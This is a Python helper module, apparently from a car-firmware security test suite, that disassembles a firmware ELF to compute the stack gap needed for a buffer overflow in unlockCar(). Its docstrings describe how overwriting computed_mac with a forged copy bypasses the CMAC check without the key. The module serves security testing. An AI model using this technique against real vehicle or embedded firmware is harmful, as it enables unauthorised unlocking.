"""
Static ELF-analysis helpers for the received_mac/computed_mac buffer-overflow
attack (see test_security.py::TestUnlockBufferOverflow.test_full_mac_bypass_blind).

Given a compiled firmware ELF, derive_mac_overwrite_offsets() parses
unlockCar()'s compiled RESPONSE_MAGIC receive path to work out the byte
distance between the attacker-controlled received_mac[8] local and the
computed_mac[16] local it gets checked against - the number a forged payload
needs to overflow one into the other.

MAX_MESSAGE_LEN mirrors messages.c's receive path:

    message->message_len = uart_readb(BOARD_UART);   // uint8_t, so 0-255
    uart_read(BOARD_UART, message->buffer, message->message_len);

However large the gap between the two buffers turns out to be, an attacker
can never declare a length past 255 - so this bounds how much of an overwrite
is actually deliverable. See MacOverwriteOffsets.reachable.
"""

import re
import subprocess
from dataclasses import dataclass
from pathlib import Path

MAX_MESSAGE_LEN = 255  # uint8_t message_len - see application/source/messages.c

MAC_COMPARE_LEN = 8  # bytes actually compared - see car.c:
                      # `memcmp(computed_mac, received_mac, 8)` right after
                      # unlockCar()'s RESPONSE_MAGIC receive. computed_mac
                      # itself is 16 bytes (AES_CMAC_digest always writes a
                      # full block), but only the first 8 are ever checked.


def arm_tool(name: str, *args: str, **kwargs) -> subprocess.CompletedProcess:
    """Run an arm-none-eabi-* binutils/gcc tool and return its completed process."""
    return subprocess.run(["arm-none-eabi-" + name, *args], capture_output=True, text=True, check=True, **kwargs)


def disasm_lines(elf: Path, func: str) -> list[str]:
    """Disassembly lines ('  addr:\\tbytes\\tmnemonic ...') for one function."""
    out = arm_tool("objdump", "-d", f"--disassemble={func}", str(elf)).stdout
    return [line for line in out.splitlines() if re.match(r"^\s*[0-9a-f]+:\t", line)]


@dataclass(frozen=True)
class MacOverwriteOffsets:
    """Everything derived for the adjacent-local MAC-bypass bug: mac_gap/
    mac_len describe overflowing one plain stack local (received_mac[8]) far
    enough to land inside a *different*, unrelated local (computed_mac[16])
    that happens to share the same frame - not into anything struct-related,
    so there's no offsetof() to fall back on; mac_gap is purely "however the
    compiler happened to lay these two out this build". mac_gap is the byte
    distance from the start of the attacker-controlled buffer to the start of
    the buffer it's checked against; mac_len is how many leading bytes of
    that buffer the comparison actually reads (see MAC_COMPARE_LEN)."""
    mac_gap: int
    mac_len: int

    @property
    def payload_len(self) -> int:
        """Total bytes needed to both populate the attacker-controlled
        buffer with a forged MAC and repeat it far enough to overwrite the
        real one - see test_security.py's _craft_mac_bypass_payload()."""
        return self.mac_gap + self.mac_len

    @property
    def reachable(self) -> bool:
        """Whether a uint8_t message_len (0-255) can deliver the full
        payload - see MAX_MESSAGE_LEN above. Expected to be trivially true
        here (mac_gap is a handful of bytes), but checked explicitly rather
        than assumed."""
        return self.payload_len <= MAX_MESSAGE_LEN


def _resolve_sp_offset(lines: list[str], before_idx: int, reg: str, max_hops: int = 4) -> int:
    """Walk backward from lines[:before_idx], resolving `reg` to a constant
    sp-relative offset. Handles the two shapes seen in this codebase for
    getting a local's address into an argument register: either directly
    (`add rX, sp, #N`) or copied from another register that was set up
    earlier (`mov rX, rY`, then rY itself resolved the same way) - the latter
    is why `push {..., lr}`-adjacent code can reuse the same base register
    (e.g. r6) across an entire function while still passing it around via
    `mov` right before each call that needs it. Follows at most max_hops such
    `mov` indirections before giving up. Fails loudly (assert), not silently,
    if `reg` can't be traced back to an `add ..., sp, #N` at all - that means
    this shape assumption no longer holds and the derivation needs updating,
    not a wrong offset returned to the caller."""
    for _ in range(max_hops):
        add_re = re.compile(rf"\badd\s+{reg},\s*sp,\s*#(\d+)\b")
        mov_re = re.compile(rf"\bmov\s+{reg},\s*(r\d+)\b")
        next_hop = None
        for j in range(before_idx - 1, -1, -1):
            m = add_re.search(lines[j])
            if m:
                return int(m.group(1))
            m = mov_re.search(lines[j])
            if m:
                next_hop = (j, m.group(1))
                break
        if next_hop is None:
            break
        before_idx, reg = next_hop
    assert False, (
        f"Couldn't resolve {reg!r} back to an 'add {reg}, sp, #N' within {max_hops} "
        f"mov-indirection hop(s) of line index {before_idx}; derivation needs updating"
    )


def derive_mac_overwrite_offsets(
    elf: Path,
    func_name: str = "unlockCar",
    response_magic: int = 0x59,  # RESPONSE_MAGIC - application/include/messages.h
    mac_call: str = "AES_CMAC_digest",
    overflow_call: str = "receive_board_message_by_type",
    buffer_field_offset: int = 8,
    mac_len: int = MAC_COMPARE_LEN,
) -> MacOverwriteOffsets:
    """Derive the MAC-bypass bug's key number: the byte distance ("mac_gap")
    from the start of func_name's attacker-controlled MAC-response buffer
    (unlockCar()'s received_mac[8]) to the start of the locally-computed MAC
    it gets checked against (computed_mac[16]). Both are plain stack locals,
    not struct members, so there's no offsetof() to read this from - it has
    to come from the compiled layout.

    receive_board_message_by_type() writes exactly `message_len`
    attacker-controlled bytes into received_mac with no bounds check, and if
    that run is long enough to also reach computed_mac's own memory - which
    happens well before the MAC comparison that follows - an attacker can
    make the tail of their own payload overwrite computed_mac with a copy of
    whatever they just put in received_mac. The comparison then degenerates
    into "does this buffer equal the copy of itself an attacker just wrote",
    true for *any* forged value, with no CMAC key needed at all.

    Locates:
      1. the `bl <overflow_call>` that receives the response, pinned down by
         the `movs r1, #<response_magic>` that sets up its magic argument
         (func_name makes more than one such call for different messages;
         this identifies the right one by the value actually sent on the
         wire, not by call order),
      2. the register stored into the message struct's buffer-pointer field
         (`str[d] rX, ..., [sp, #buffer_field_offset]`) shortly before that
         call, resolved back to its own frame offset via _resolve_sp_offset -
         this is received_mac's address,
      3. the nearest preceding `bl <mac_call>` (the computed_mac producer
         this response is checked against) and its 4th argument (r3, the
         output buffer), resolved the same way - this is computed_mac's
         address.

    mac_gap is (2)'s offset subtracted from (1)'s. Fails loudly (assert) if
    any of these shapes don't match what's expected, rather than silently
    deriving a wrong gap."""
    lines = disasm_lines(elf, func_name)
    assert lines, (
        f"{func_name!r} produced no disassembly from {elf} - check the name is spelled "
        f"right and wasn't compiled out (e.g. by a #ifdef TEST_BUILD it lives inside)"
    )

    overflow_call_re = re.compile(rf"\bbl\s+[0-9a-f]+\s*<{re.escape(overflow_call)}>")
    magic_re = re.compile(rf"movs\s+r1,\s*#{response_magic}\b")

    call_idx = None
    for i, line in enumerate(lines):
        if not overflow_call_re.search(line):
            continue
        if any(magic_re.search(lines[j]) for j in range(max(i - 8, 0), i)):
            call_idx = i
            break
    assert call_idx is not None, (
        f"No 'bl <{overflow_call}>' preceded (within 8 lines) by 'movs r1, #{response_magic}' "
        f"found in {func_name} - either the RESPONSE_MAGIC receive isn't there in this build, "
        f"response_magic is wrong, or derivation needs updating"
    )

    buf_store_re = re.compile(
        rf"str[d]?\.?w?\s+(r\d+),\s*(?:r\d+,\s*)?\[sp,\s*#{buffer_field_offset}\]"
    )
    store_idx = next((j for j in range(call_idx - 1, -1, -1) if buf_store_re.search(lines[j])), None)
    assert store_idx is not None, (
        f"No buffer-pointer store to '[sp, #{buffer_field_offset}]' found before the "
        f"RESPONSE_MAGIC receive in {func_name}; derivation needs updating"
    )
    overflow_reg = buf_store_re.search(lines[store_idx]).group(1)
    overflow_offset = _resolve_sp_offset(lines, store_idx, overflow_reg)

    mac_call_re = re.compile(rf"\bbl\s+[0-9a-f]+\s*<{re.escape(mac_call)}>")
    mac_idx = next((j for j in range(call_idx - 1, -1, -1) if mac_call_re.search(lines[j])), None)
    assert mac_idx is not None, (
        f"No preceding 'bl <{mac_call}>' found before the RESPONSE_MAGIC receive in "
        f"{func_name} - can't identify the computed_mac this response is checked against"
    )
    mac_offset = _resolve_sp_offset(lines, mac_idx, "r3")

    return MacOverwriteOffsets(mac_gap=mac_offset - overflow_offset, mac_len=mac_len)
